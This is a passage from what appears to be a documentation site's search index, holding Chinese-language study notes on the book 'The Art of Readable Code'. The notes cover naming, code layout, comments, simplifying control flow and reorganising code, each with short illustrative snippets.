\u4e0a\u9762\u7684\u4ee3\u7801\u5c31\u4e0d\u9002\u7528\u4e8e\u8fd9\u6761\u89c4\u5219\uff0c\u5b83\u7684\u5355\u6761\u8bed\u53e5\u8fc7\u957f\u4ee5\u81f4\u9700\u8981\u6362\u884c\uff0c\u540c\u65f6\u6211\u4eec\u53d1\u73b0\u5b83\u7684\u529f\u80fd\u662f\u91cd\u590d\u7684\u3002\u6b64\u65f6\u53ef\u4ee5\u4f7f\u7528\u51fd\u6570\u5bf9\u5176\u8fdb\u884c\u5305\u88f9\u4e0e\u6574\u7406\uff0c\u5c31\u53ef\u4ee5\u8fbe\u5230\u4e0b\u9762\u7684\u72b6\u6001\uff1a CheckFullName ( \"Doug Adams\" , \"Mr. Douglas Adams\" , \"\" ); CheckFullName ( \"Jake Brown\" , \"Mr. Jocob Brown III\" , \"\" ); CheckFullName ( \"No such Guy\" , \"\" , \"no match found\" ); CheckFullName ( \"John\" , \"\" , \"more than one result\" ); \ud83d\udca1\u65b9\u6cd5\u4e8c\uff1a\u4f7f\u7528\u5217\u5bf9\u9f50\u3002 \u5217\u7684\u8fb9\u63d0\u4f9b\u4e86\u201c\u53ef\u89c1\u7684\u680f\u6746\u201d\uff0c\u9605\u8bfb\u8d77\u6765\u5f88\u65b9\u4fbf\uff0c\u8fd9\u662f\u4e2a\u201c\u8ba9\u76f8\u4f3c\u7684\u4ee3\u7801\u770b\u8d77\u6765\u76f8\u4f3c\u7684\u597d\u4f8b\u5b50\u201d\u3002 \u5bf9\u4e8e\u65b9\u6cd5\u4e00\u4e2d\u7528\u51fd\u6570\u6574\u7406\u8fc7\u7684\u4ee3\u7801\uff0c\u5176\u5b9e\u770b\u8d77\u6765\u4ecd\u4e0d\u662f\u5f88\u76f4\u89c2\uff0c\u53ef\u80fd\u7684\u539f\u56e0\u5c31\u662f\u65e0\u6cd5\u4e00\u773c\u770b\u51fa\u5f53\u524d\u7684\u5b57\u7b26\u4e32\u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\u3002\u6b64\u65f6\u5c31\u53ef\u4ee5\u4f7f\u7528\u5217\u5bf9\u9f50\u4f7f\u5176\u8bed\u4e49\u66f4\u52a0\u4e00\u76ee\u4e86\u7136\u3002 CheckFullName ( \"Doug Adams\" , \"Mr. Douglas Adams\" , \"\" ); CheckFullName ( \"Jake Brown\" , \"Mr. Jocob Brown III\" , \"\" ); CheckFullName ( \"No such Guy\" , \"\" , \"no match found\" ); CheckFullName ( \"John\" , \"\" , \"more than one result\" ); \ud83d\udca1\u65b9\u6cd5\u4e09\uff1a\u56fa\u5b9a\u987a\u5e8f\u3002 \u5f88\u591a\u65f6\u5019\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u7c7b\u4e2d\u7684\u5f88\u591a\u53d8\u91cf\uff0c\u65e0\u8bba\u662f\u5728\u58f0\u660e\u8fd8\u662f\u5728\u4f7f\u7528\u65f6\uff0c\u6700\u597d\u80fd\u4fdd\u6301\u4e00\u5b9a\u7684\u987a\u5e8f\uff08\u6bd4\u5982\u91cd\u8981\u6027\uff0c\u6216\u8005\u5b57\u7b26\u5927\u5c0f\u7b49\u7b49\uff09\uff0c\u5e76\u5728\u540e\u9762\u4e00\u76f4\u6cbf\u7528\u6b64\u987a\u5e8f\u3002 \ud83d\udca1\u65b9\u6cd5\u56db\uff1a\u5206\u6bb5\u4ee3\u7801\u3002 \u5bf9\u4ee3\u7801\u8fdb\u884c\u5206\u6bb5\u6709\u8bf8\u591a\u597d\u5904\uff0c\u9996\u5148\u5b83\u5c06\u76f8\u4f3c\u529f\u80fd\u7684\u4ee3\u7801\u653e\u5728\u4e00\u8d77\uff0c\u80fd\u5e2e\u52a9\u7406\u89e3\u4ee3\u7801\u7684\u903b\u8f91\uff0c\u5feb\u901f\u901a\u8bfb\u4ee3\u7801\uff08\u7279\u522b\u662f\u914d\u5408\u6ce8\u91ca\u9605\u8bfb\u65f6\uff09\u3002\u540c\u65f6\u4e5f\u53ef\u4ee5\u5e2e\u52a9\u8bfb\u8005\u5b9a\u4f4d\u81ea\u5df1\u73b0\u5728\u6240\u9605\u8bfb\u7684\u4f4d\u7f6e\u3002\u4ee5\u4e0b\u662f\u4e00\u4e2a\u4f8b\u5b50\uff1a def suggest_new_friends ( user , email_password ): # Get the user's friends' email addresses. friends = user . friends (); friends_emails = set ( f . email for f in friends ) # Import all email addresses from this user's email account. contacts = import_contacts ( user . email , email_password ) contact_emails = set ( c . email for c in contacts ) # Find matching users that they aren't already friends with. non_friend_emails = contact_emails - friend_emails suggested_friends = User . objects . select ( email_in = non_friend_emails ) # Display these lists on the page. display [ 'user' ] = user display [ 'friends' ] = friends display [ 'suggested_friends' ] = suggested_friends return render ( \"sugguested_friends.html\" , display ) 1.3 \u6ce8\u91ca \u9996\u5148\u6211\u4eec\u9700\u8981\u77e5\u9053\u5728\u54ea\u4e9b\u60c5\u51b5\u4e0b\u662f\u4e0d\u9700\u8981\u6ce8\u91ca\u7684\uff1a \u4e3a\u4e86\u5199\u6ce8\u91ca\u800c\u5199\u6ce8\u91ca\uff0c\u5373\u6ca1\u6709\u63d0\u4f9b\u66f4\u591a\u4fe1\u606f\u7684\u6ce8\u91ca \u4e3a\u89e3\u91ca\u6666\u6da9\u7684\u547d\u540d\u7684\u6ce8\u91ca\u3002\u597d\u4ee3\u7801>\u574f\u4ee3\u7801+\u597d\u6ce8\u91ca \u5728\u5f88\u591a\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u80fd\u5bf9\u5982\u4f55\u5199\u6ce8\u91ca\u4ecd\u65e0\u4ece\u4e0b\u624b\uff0c\u4f5c\u8005\u7ed9\u51fa\u4e86\u4e00\u4e9b\u7ecf\u5178\u7684\u5e94\u7528\u573a\u666f\u3002 \ud83c\udfdd \u573a\u666f\u4e00\uff1a\u4e3a\u4ee3\u7801\u4e2d\u7684\u7455\u75b5\u5199\u6ce8\u91ca\u3002 \u6807\u8bb0 \u901a\u5e38\u7684\u610f\u4e49 TODO: \u8fd8\u6ca1\u6709\u5904\u7406\u7684\u4e8b\u60c5 FIXME: \u5df2\u77e5\u7684\u65e0\u6cd5\u8fd0\u884c\u7684\u4ee3\u7801 HACK: \u5bf9\u4e00\u4e2a\u95ee\u9898\u4e0d\u5f97\u4e0d\u91c7\u7528\u7684\u6bd4\u8f83\u7c97\u7cd9\u7684\u65b9\u6cd5 // TODO: add connect function \ud83c\udfdd \u573a\u666f\u4e8c\uff1a\u4e3a\u5e38\u91cf\u52a0\u6ce8\u91ca\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6bcf\u4e2a\u5e38\u91cf\u90fd\u6709\u4e00\u4e2a\u8bbe\u7f6e\u4e3a\u8be5\u503c\u7684\u7f18\u7531\u3002 // Impose a reasonable limit - no human can read that much anyway const int MAX_RSS_SUBSCRIPTION = 1000 ; \ud83c\udfdd \u573a\u666f\u4e09\uff1a\u53ef\u80fd\u5f15\u8d77\u6b67\u4e49\u7684\u5730\u65b9\u3002 \ud83c\udfdd \u573a\u666f\u56db\uff1a\u53ef\u80fd\u5b58\u5728\u95ee\u9898\u7684\u5730\u65b9\u3002 \ud83c\udfdd \u573a\u666f\u4e94\uff1a\u603b\u7ed3\u6027\u7684\u6ce8\u91ca\u3002 \u5bf9\u4e8e\u4e00\u4e9b\u4ee3\u7801\u5757\uff0c\u5728\u524d\u9762\u52a0\u4e0a\u6ce8\u91ca\u53ef\u4ee5\u65b9\u6cd5\u8bfb\u8005\u5728\u9605\u8bfb\u4ee3\u7801\u7ec6\u8282\u524d\u6709\u4e00\u4e2a\u603b\u4f53\u7684\u5370\u8c61\u3002\u5c31\u5982\u6392\u7248\u7684\u7b2c\u56db\u4e2a\u65b9\u6cd5\u7684\u4f8b\u5b50\u4e2d\u7684\u5e94\u7528\u90a3\u6837\uff0c\u548c\u4ee3\u7801\u5206\u5757\u914d\u5408\u4f7f\u7528\uff0c\u4f1a\u67091+1>2\u7684\u6548\u679c\u3002 2 \u7b80\u5316\u5faa\u73af\u903b\u8f91 2.1 \u4f18\u5316\u63a7\u5236\u6d41 \u2705 \u5efa\u8bae\u4e00\uff1a\u8c03\u6574\u5224\u65ad\u6761\u4ef6\u7684\u5de6\u53f3\u987a\u5e8f \u5bf9\u4e8e\u4ee5\u4e0b\u4e24\u6761\u6307\u4ee4\uff0c\u76f8\u4fe1\u4f60\u4f1a\u66f4\u559c\u6b22\u524d\u8005\u800c\u4e0d\u662f\u540e\u8005\uff0c\u8fd9\u53ef\u80fd\u4e0e\u6211\u4eec\u7684\u601d\u7ef4\u4e60\u60ef\u6709\u5173\u7cfb\u3002\u5728\u7f16\u5199\u4ee3\u7801\u65f6\uff0c\u8bf7\u5c3d\u91cf\u5c06\u5e38\u91cf\u653e\u5728\u53f3\u8fb9\uff0c\u800c\u4f1a\u53d8\u5316\u7684\uff0c\u88ab\u7528\u4e8e\u68c0\u67e5\u3001\u6bd4\u8f83\u7684\u503c\u653e\u5728\u5de6\u8fb9\u3002 // \u53d8\u91cf\u5728\u5de6\uff0c\u5e38\u91cf\u5728\u53f3 if ( length >= 10 ) { // do something } // \u5e38\u91cf\u5728\u5de6\uff0c\u53d8\u91cf\u5728\u53f3 if ( 10 <= length ) { // do something } \u2705 \u5efa\u8bae\u4e8c\uff1a\u8c03\u6574\u6761\u4ef6\u8bed\u53e5\u7684\u524d\u540e\u987a\u5e8f \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u80fd\u559c\u6b22 \u6b63 \u903b\u8f91\u5927\u4e8e \u8d1f \u903b\u8f91\u3002 // \u6b63\u903b\u8f91 if ( a == b ) { // do somehting } else { // do something } // \u8d1f\u903b\u8f91 if ( a != b ) { // do something } else { // do something } \u5148\u5904\u7406 \u7b80\u5355 \u7684\u903b\u8f91\uff0c\u518d\u5904\u7406 \u590d\u6742 \u7684\u903b\u8f91 \u5f53\u7136\uff0c\u5f88\u591a\u60c5\u51b5\u4e0b\uff0c\u903b\u8f91\u7684\u590d\u6742\u4e0e\u5426\u548c\u524d\u9762\u7684\u6b63\u8d1f\u903b\u8f91\u4f1a\u53d1\u751f\u51b2\u7a81\uff0c\u8fd9\u65f6\u5c31\u9700\u8981\u8fdb\u884c\u53d6\u820d\u548c\u8003\u91cf\u4e86\u3002\u4ee5\u4e0b\u5c31\u662f\u4e3a\u5148\u5904\u7406\u91cd\u8981\u7684\u903b\u8f91\u800c\u540c\u65f6\u201c\u8fdd\u80cc\u201d\u7b80\u5355\u903b\u8f91\u539f\u5219\u548c\u6b63\u903b\u8f91\u539f\u5219\u7684\u7ecf\u5178\u4f8b\u5b50\uff1a if not file : # Log the error ... else : # ... \u2705 \u5efa\u8bae\u4e09\uff1a\u8c28\u614e\u4f7f\u7528\u53ef\u80fd\u5f71\u54cd\u53ef\u8bfb\u6027\u7684\u8868\u8fbe\u5f0f\u3002 \u4e09\u76ee\u8fd0\u7b97\u7b26 return exponent >=0 ? mantissa * (1 << exponent) : mantissa / (1 << -exponent); do/while \u5faa\u73af goto \u2705 \u5efa\u8bae\u56db\uff1a\u6700\u5c0f\u5316\u6761\u4ef6\u8bed\u53e5\u5d4c\u5957\u3002 \u5f88\u591a\u60c5\u51b5\u4e0b\uff0c\u5728\u524d\u4eba\u57fa\u7840\u4e0a\u8fdb\u884c\u529f\u80fd\u6dfb\u52a0\u65f6\uff0c\u5c31\u5bb9\u6613\u51fa\u73b0\u5728\u8bed\u53e5\u4e2d\u5d4c\u5957\u6761\u4ef6\u8bed\u53e5\uff0c\u4f8b\u5982\u4e0b\u65b9\u65f6\u4ee3\u7801\u539f\u6709\u903b\u8f91\u3002 if ( user_result == SUCCESS ) { reply . WriteErrors ( \"\" ); } else { reply . WriteErrors ( user_result ); } \u540e\u6765\u589e\u52a0\u903b\u8f91\u540e\u53d8\u4e3a\uff1a if ( user_result == SUCCESS ) { if ( permission_result != SUCCESS ) { reply . WriteErrors ( \"error reading permissions\" ); return ; } reply . WriteErrors ( \"\" ); } else { reply . WriteErrors ( user_result ); } \u5b9e\u9645\u4e0a\uff0c\u53ea\u8981\u518d\u7565\u52a0\u601d\u8003\uff0c\u5c31\u80fd\u5c06\u4e0a\u9762\u4e0d\u7f8e\u89c2\u4e14\u96be\u4ee5\u7406\u89e3\u7684\u4ee3\u7801\u903b\u8f91\u7b80\u5316\u3002 if ( user_result != SUCCESS ) { reply . WriteErrors ( user_result ); } else if ( permission_result != SUCCESS ) { reply . WriteErrors ( \"error reading permissions\" ); } else { reply . WriteErrors ( \"\" ); } 2.2 \u62c6\u5206\u957f\u8868\u8fbe\u5f0f \u62c6\u5206\u957f\u8868\u8fbe\u5f0f\u7684\u5185\u5bb9\u5728 1.2 \u6392\u7248 \u4e2d\u7565\u6709\u63d0\u53ca\uff0c\u8868\u8fbe\u5f0f\u8fc7\u957f\u6709\u4e24\u4e2a\u7f3a\u70b9\uff0c\u4e00\u65b9\u9762\u662f\u4e0d\u591f\u7f8e\u89c2\uff0c\u53e6\u4e00\u65b9\u9762\u53ef\u8bfb\u6027\u4e5f\u4e0d\u591f\u5f3a\u3002\u5c31\u5982\u4e0b\u65b9\u4ee3\u7801\uff0c\u5224\u65ad\u6761\u4ef6\u7684\u5de6\u8fb9\u90e8\u5206\u53c8\u662f split \u53c8\u662f strip \uff0c\u542b\u4e49\u5e76\u4e0d\u591f\u6e05\u9664\u660e\u767d\u3002 if line . split ( ':' )[ 0 ] . strip () == \"root\" : # do something elif line . split ( ':' )[ 0 ] . strip () == \"user1\" : # do something \u82e5\u5c06\u88ab\u5224\u65ad\u7684\u503c\u8d4b\u7ed9\u4e00\u4e2a\u53d8\u91cf\uff0c\u5c31\u53ef\u4ee5\u4f7f\u5f97\u5224\u65ad\u6761\u4ef6\u66f4\u52a0\u76f4\u89c2\u53ef\u8bfb\u3002 username = line . split ( ':' )[ 0 ] . strip () if username == \"root\" : # do something elif username == \"user1\" : # do something \u5f53\u7136\u9664\u4e86\u4f7f\u7528 \u53d8\u91cf \u5916\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 \u51fd\u6570 / \u5b8f\u5b9a\u4e49 \u5728\u5408\u9002\u7684\u573a\u666f\u4e2d\u8fbe\u5230\u62c6\u5206\u957f\u8868\u8fbe\u5f0f\u7684\u76ee\u7684\u3002 2.3 \u5408\u7406\u8bbe\u7f6e\u53d8\u91cf \u5728\u4e0a\u4e00\u7ae0\u4e2d\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u4e3a\u4e86\u589e\u52a0\u4ee3\u7801\u53ef\u8bfb\u6027\u62c6\u5206\u957f\u8868\u8fbe\u5f0f\u800c\u589e\u8bbe\u53d8\u91cf\uff0c\u4f46\u662f\u5728\u4ee3\u7801\u53ef\u8bfb\u6027\u4e0d\u53d7\u5f71\u54cd\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5f53\u5c3d\u53ef\u80fd\u5730\u51cf\u5c11\u53d8\u91cf\uff0c\u5e76\u5c3d\u53ef\u80fd\u5730\u4f7f\u7528\u5e38\u91cf\u3002\u5bf9\u4e8e\u4e00\u4e2a\u53d8\u91cf\uff0c\u7f29\u5c0f\u8d77\u4f5c\u7528\u57df\u4e5f\u53ef\u4ee5\u907f\u514d\u5236\u9020\u8fc7\u591a\u7684 bug\u3002 \u6bd4\u5982\u4e0b\u65b9\u4ee3\u7801\uff0c\u82e5 now \u53ea\u5728\u4e00\u4e2a\u5730\u65b9\u7528\u5230\uff0c\u5219\u4e0d\u5982\u5220\u53bb now \u4ee5\u7f29\u51cf\u4e0d\u5fc5\u8981\u7684\u53d8\u91cf\uff0c\u4e14\u8fd9\u6837\u7684\u4f5c\u6cd5\u51e0\u4e4e\u4e0d\u4f1a\u5f71\u54cd\u53ef\u8bfb\u6027\u3002 now = datatime . datetime . now () root_message . last_view_time = now root_message . last_view_time = datatime . datetime . now () 3 \u91cd\u65b0\u7ec4\u7ec7\u4ee3\u7801 \u8be5\u90e8\u5206\u4f1a\u8ba8\u8bba\u53ef\u4ee5\u5728\u51fd\u6570\u7ea7\u522b\u5bf9\u4ee3\u7801\u505a\u66f4\u5927\u7684\u6539\u52a8\uff0c\u5177\u4f53\u6765\u8bb2\uff0c\u6211\u4eec\u4f1a\u8bb2\u5230\u4e09\u79cd\u7ec4\u7ec7\u4ee3\u7801\u7684\u65b9\u6cd5\uff1a \u62bd\u53d6\u51fa\u90a3\u4e9b\u4e0e\u7a0b\u5e8f\u4e3b\u8981\u76ee\u7684\u201c\u4e0d\u76f8\u5173\u7684\u5b50\u95ee\u9898\u201d\u3002 \u91cd\u65b0\u7ec4\u7ec7\u4ee3\u7801\u4f7f\u4ed6\u4e00\u6b21\u53ea\u505a\u4e00\u4ef6\u4e8b\u60c5\u3002 \u5148\u7528\u81ea\u7136\u8bed\u8a00\u63cf\u8ff0\u4ee3\u7801\uff0c\u7136\u540e\u7528\u8fd9\u4e2a\u63cf\u8ff0\u6765\u5e2e\u52a9\u4f60\u627e\u5230\u66f4\u6574\u6d01\u7684\u89e3\u51b3\u65b9\u6848\u3002 \u2705 \u5efa\u8bae\u4e00\uff1a\u5206\u79bb\u4ee3\u7801\u3002 \u7b80\u800c\u8a00\u4e4b\uff0c\u5373\u628a\u201c\u4e00\u822c\u4ee3\u7801\u548c\u9879\u76ee\u4e13\u6709\u7684\u4ee3\u7801\u5206\u5f00\u201d\u3002 \u2705 \u5efa\u8bae\u4e8c\uff1a\u4e00\u6b21\u53ea\u505a\u4e00\u4ef6\u4e8b\u3002 \u5c06\u6240\u6709\u8981\u505a\u7684\u4efb\u52a1\u5206\u51fa\u6765\uff0c\u5e76\u8fd9\u4e9b\u4efb\u52a1\u53d8\u6210\u5355\u72ec\u7684\u51fd\u6570\u6291\u6216\u4ee3\u7801\u4e2d\u7684\u4e00\u4e2a\u6bb5\u843d\u3002 \u2705 \u5efa\u8bae\u4e09\uff1a\u5c06\u60f3\u6cd5\u53d8\u6210\u4ee3\u7801\u3002 \u2705 \u5efa\u8bae\u56db\uff1a\u5c11\u4e9b\u4ee3\u7801\u3002 \u5728\u9047\u5230\u95ee\u9898\u65f6\uff0c\u7b2c\u4e00\u53cd\u5e94\u4e0d\u5f53\u662f\u81ea\u5df1\u53bb\u5199\u4e00\u4e2a\u529f\u80fd\u53bb\u89e3\u51b3\u9700\u6c42\u3002\u82e5\u80fd\u8bc9\u8bf8\u73b0\u6709\u7684\u5e93\u6216\u8005\u7cfb\u7edf\u5de5\u5177\u89e3\u51b3\uff0c\u4f7f\u7528\u8fd9\u4e9b\u6210\u719f\u7684\u5de5\u5177\u53ef\u80fd\u8981\u6bd4\u4ece\u5934\u5f00\u59cb\u8bbe\u8ba1\u53ef\u9760\u7684\u591a\u3002","title":"The Art of the Readable Code"},{"location":"misc/code/#the-art-of-the-readable-code","text":"Info \u672c\u7bc7\u7b14\u8bb0\u4e3b\u8981\u6458\u81ea\u300a\u7f16\u5199\u53ef\u8bfb\u4ee3\u7801\u7684\u827a\u672f\u300b\uff08The Art of Readable Code\uff09\u3002\u6709\u591a\u5e74\u5de5\u7a0b\u4ee3\u7801\u7f16\u7a0b\u7ecf\u9a8c\u7684\u4f5c\u8005\uff0c\u7531\u6d45\u5165\u6df1\u5730\u4ecb\u7ecd\u4e86\u5982\u4f55\u7f16\u5199\u53ef\u8bfb\u4ee3\u7801\u7684\u6280\u5de7\u4e0e\u539f\u5219\uff0c\u4ece\u4ee3\u7801\u98ce\u683c\u5230\u903b\u8f91\u6846\u67b6\u7684\u6784\u5efa\uff0c\u7ed9\u51fa\u4e86\u4e0d\u5c11\u5b9e\u7528\u7684\u5efa\u8bae\u3002","title":"The Art of the Readable Code"},{"location":"misc/code/#1","text":"","title":"1 \u8868\u9762\u5c42\u6b21\u7684\u6539\u8fdb"},{"location":"misc/code/#11","text":"\ud83d\udca1\u5efa\u8bae\u4e00\uff1a\u907f\u514d\u7a7a\u6d1e\u7684\u8bcd\u6c47\uff0c\u6bd4\u5982\uff1a get , size ...\uff0c\u53ef\u66ff\u6362\u6210 height , fetch , load ... \u5355\u8bcd \u66f4\u591a\u9009\u62e9 send deliver, dispatch, distribute find search, extract, locate start create, begin, open make create, build, add \ud83d\udca1\u5efa\u8bae\u4e8c\uff1a\u6b63\u786e\u4f7f\u7528\u7279\u6b8a\u8bcd\u6c47\u3002 \u6bd4\u5982\u7d22\u5f15\u548c\u8fed\u4ee3\u5668\uff1a i \uff0c j \uff0c it ...\uff1b\u6216\u8005\u4e34\u65f6\u53d8\u91cf tmp ... \u5728\u5faa\u73af\u4e2d\uff0c\u4e3a\u4f7f\u5f97\u4e0d\u4f1a\u9519\u4f4d\u4f7f\u7528\u8fed\u4ee3\u5668\uff0c\u53ef\u4ee5\u5728\u8fed\u4ee3\u5668\u4e2d\u52a0\u5165\u76f8\u5173\u4fe1\u606f\uff0c\u5982 number_i \uff0c club_i \u3002 \ud83d\udca1\u5efa\u8bae\u4e09\uff1a\u7ed9\u540d\u5b57\u9644\u4e0a\u989d\u5916\u7684\u4fe1\u606f\u3002 \u5df2\u8f6c\u5316\u4e3a UTF-8 \u683c\u5f0f \u7684 html \u5b57\u8282\uff1a html_utf8 \u7a0b\u5e8f\u5f00\u59cb\u65f6\u95f4\uff0c\u4ee5\u6beb\u79d2\u4e3a \u5355\u4f4d \uff1a start_ms \ud83d\udca1\u5efa\u8bae\u56db\uff1a\u4e0d\u5b9c\u8fc7\u957f\u3002 \u5f53\u7136\u5728\u53d8\u91cf\u4e2d\u4e00\u5473\u5730\u5b58\u50a8\u4fe1\u606f\u4e5f\u662f\u4e0d\u5f97\u5f53\u7684\uff0c\u4e0d\u7136\u5c31\u53ef\u80fd\u4f1a\u4f7f\u5b83\u53c8\u81ed\u53c8\u957f\uff0c\u53ef\u4ee5\u9002\u5f53\u4f7f\u7528\u4e00\u4e9b\u65b9\u6cd5\u4f7f\u5176\u7f29\u77ed\u3002 \u4f7f\u7528\u9996\u5b57\u6bcd\u7f29\u7565\u8bcd\uff1a\u4f46\u4ec5\u4ec5\u5e94\u7528\u4e8e\u7ea6\u5b9a\u4fd7\u6210\u7684\u7f29\u5199\uff0c\u5982 evaluation -> eval \uff0c documentation -> doc \u3002\u4e66\u4e2d\u63d0\u51fa\u4e86\u4e00\u4e2a\u5f88\u76f4\u622a\u4e86\u5f53\u7684\u4f7f\u7528\u573a\u666f\u5224\u65ad\u65b9\u6cd5\uff1a\u8ba9\u8fd9\u4e9b\u7f29\u5199\u5bf9\u9879\u76ee\u7684 \u65b0\u6210\u5458 \u6765\u8bf4 \u4e0d\u964c\u751f\u548c\u8d39\u89e3 \u3002 \u4e22\u6389\u6ca1\u7528\u7684\u8bcd\u6c47\uff0c\u5982 ConvertToString -> ToString \u3002 \ud83d\udca1\u5efa\u8bae\u4e94\uff1a\u5728\u5c0f\u7684\u4f5c\u7528\u57df\u4e2d\u4f7f\u7528\u8f83\u77ed\u7684\u540d\u5b57\uff1b\u76f8\u53cd\uff0c\u4f5c\u7528\u57df\u5927\u7684\u8bcd\u6c47\u5e94\u5c3d\u53ef\u80fd\u957f\u4e14\u8be6\u7ec6\u3002 \ud83d\udca1\u5efa\u8bae\u516d\uff1a\u907f\u514d\u6b67\u4e49\u3002 \u5efa\u8bae\u867d\u77ed\uff0c\u4f46\u5176\u5b9e\u5f88\u96be\u505a\u5230\u5b8c\u7f8e\u3002\u6bd4\u5982\u5bf9\u4e8e\u5e03\u5c14\u503c\uff0c bool read_password = true \uff0c\u5c31\u5bb9\u6613\u4ea7\u751f\u4e24\u79cd\u610f\u601d\uff1a1\uff09\u8981\u53bb\u8bfb\u5bc6\u7801 2\uff09\u5df2\u7ecf\u8bfb\u5165\u5bc6\u7801\uff0c\u6b64\u65f6\u5c31\u53ef\u4ee5\u901a\u8fc7 need_password \u6216 user_is_authenticated \u66ff\u4ee3\u3002","title":"1.1 \u8d77\u540d\u7684\u827a\u672f"},{"location":"misc/code/#12","text":"\u4e66\u4e2d\u6b64\u5757\u7684\u5185\u5bb9\u662f\u300a\u5ba1\u7f8e\u300b\uff0c\u4f46\u603b\u4f53\u662f\u548c\u4ee3\u7801\u6392\u7248\u76f8\u5173\u7684\uff0c\u6240\u4ee5\u4f7f\u7528\u6392\u7248\u4f5c\u4e3a\u6982\u62ec\u53ef\u80fd\u66f4\u4e3a\u6070\u5f53\u3002\u9996\u5148\uff0c\u4e66\u4e2d\u63d0\u51fa\u4e86\u4e09\u6761\u539f\u5219\uff1a \u4f7f\u7528\u4e00\u81f4\u7684\u5e03\u5c40\uff0c\u8ba9\u8bfb\u8005\u80fd\u5feb\u901f\u9002\u5e94 \u5f53\u76f8\u4f3c\u7684\u4ee3\u7801\u5c3d\u53ef\u80fd\u76f8\u4f3c \u628a\u76f8\u5173\u7684\u4ee3\u7801\u5206\u7ec4\uff0c\u5f62\u6210\u4ee3\u7801\u5757 \u5177\u4f53\u800c\u8a00\uff0c\u4e3a\u4e86\u8ba9\u4ee3\u7801\u53d8\u5f97\u6574\u9f50\uff0c\u6211\u4eec\u6709\u5982\u4e0b\u53ef\u4ee5\u53c2\u8003\u7684\u65b9\u6cd5\u3002 \ud83d\udca1\u65b9\u6cd5\u4e00\uff1a\u4f7f\u7528\u51fd\u6570\u3002 \u5c31\u5982\u4e66\u4e2d\u4e09\u6761\u539f\u5219\u4e2d\u7684\u7b2c\u4e8c\u6761\uff0c\u6211\u4eec\u5e94\u5f53\u8ba9\u76f8\u4f3c\u529f\u80fd\u7684\u4ee3\u7801\u5728\u5916\u89c2\u4e0a\u4e5f\u5c3d\u53ef\u80fd\u76f8\u4f3c\u3002 assert ( ExpendFullName ( database_connection , \"Doug Adams\" , & error ) == \"Mr. Douglas Adams\" ); assert ( error == \"\" ); assert ( ExpendFullName ( database_connection , \"Jake Brown\" , & error ) == \"Mr. Jocob Brown III\" ); assert ( error == \"\" ); assert ( ExpendFullName ( database_connection , \"No Such Guy\" , & error ) == \"\" ); assert ( error == \"on match found\" ); assert ( ExpendFullName ( database_connection , \"John\" , & error ) == \"\" ); assert ( error == \"more than one result\" ); \u4e0a\u9762\u7684\u4ee3\u7801\u5c31\u4e0d\u9002\u7528\u4e8e\u8fd9\u6761\u89c4\u5219\uff0c\u5b83\u7684\u5355\u6761\u8bed\u53e5\u8fc7\u957f\u4ee5\u81f4\u9700\u8981\u6362\u884c\uff0c\u540c\u65f6\u6211\u4eec\u53d1\u73b0\u5b83\u7684\u529f\u80fd\u662f\u91cd\u590d\u7684\u3002\u6b64\u65f6\u53ef\u4ee5\u4f7f\u7528\u51fd\u6570\u5bf9\u5176\u8fdb\u884c\u5305\u88f9\u4e0e\u6574\u7406\uff0c\u5c31\u53ef\u4ee5\u8fbe\u5230\u4e0b\u9762\u7684\u72b6\u6001\uff1a CheckFullName ( \"Doug Adams\" , \"Mr. Douglas Adams\" , \"\" ); CheckFullName ( \"Jake Brown\" , \"Mr. Jocob Brown III\" , \"\" ); CheckFullName ( \"No such Guy\" , \"\" , \"no match found\" ); CheckFullName ( \"John\" , \"\" , \"more than one result\" ); \ud83d\udca1\u65b9\u6cd5\u4e8c\uff1a\u4f7f\u7528\u5217\u5bf9\u9f50\u3002 \u5217\u7684\u8fb9\u63d0\u4f9b\u4e86\u201c\u53ef\u89c1\u7684\u680f\u6746\u201d\uff0c\u9605\u8bfb\u8d77\u6765\u5f88\u65b9\u4fbf\uff0c\u8fd9\u662f\u4e2a\u201c\u8ba9\u76f8\u4f3c\u7684\u4ee3\u7801\u770b\u8d77\u6765\u76f8\u4f3c\u7684\u597d\u4f8b\u5b50\u201d\u3002 \u5bf9\u4e8e\u65b9\u6cd5\u4e00\u4e2d\u7528\u51fd\u6570\u6574\u7406\u8fc7\u7684\u4ee3\u7801\uff0c\u5176\u5b9e\u770b\u8d77\u6765\u4ecd\u4e0d\u662f\u5f88\u76f4\u89c2\uff0c\u53ef\u80fd\u7684\u539f\u56e0\u5c31\u662f\u65e0\u6cd5\u4e00\u773c\u770b\u51fa\u5f53\u524d\u7684\u5b57\u7b26\u4e32\u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\u3002\u6b64\u65f6\u5c31\u53ef\u4ee5\u4f7f\u7528\u5217\u5bf9\u9f50\u4f7f\u5176\u8bed\u4e49\u66f4\u52a0\u4e00\u76ee\u4e86\u7136\u3002 CheckFullName ( \"Doug Adams\" , \"Mr. Douglas Adams\" , \"\" ); CheckFullName ( \"Jake Brown\" , \"Mr. Jocob Brown III\" , \"\" ); CheckFullName ( \"No such Guy\" , \"\" , \"no match found\" ); CheckFullName ( \"John\" , \"\" , \"more than one result\" ); \ud83d\udca1\u65b9\u6cd5\u4e09\uff1a\u56fa\u5b9a\u987a\u5e8f\u3002 \u5f88\u591a\u65f6\u5019\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u7c7b\u4e2d\u7684\u5f88\u591a\u53d8\u91cf\uff0c\u65e0\u8bba\u662f\u5728\u58f0\u660e\u8fd8\u662f\u5728\u4f7f\u7528\u65f6\uff0c\u6700\u597d\u80fd\u4fdd\u6301\u4e00\u5b9a\u7684\u987a\u5e8f\uff08\u6bd4\u5982\u91cd\u8981\u6027\uff0c\u6216\u8005\u5b57\u7b26\u5927\u5c0f\u7b49\u7b49\uff09\uff0c\u5e76\u5728\u540e\u9762\u4e00\u76f4\u6cbf\u7528\u6b64\u987a\u5e8f\u3002 \ud83d\udca1\u65b9\u6cd5\u56db\uff1a\u5206\u6bb5\u4ee3\u7801\u3002 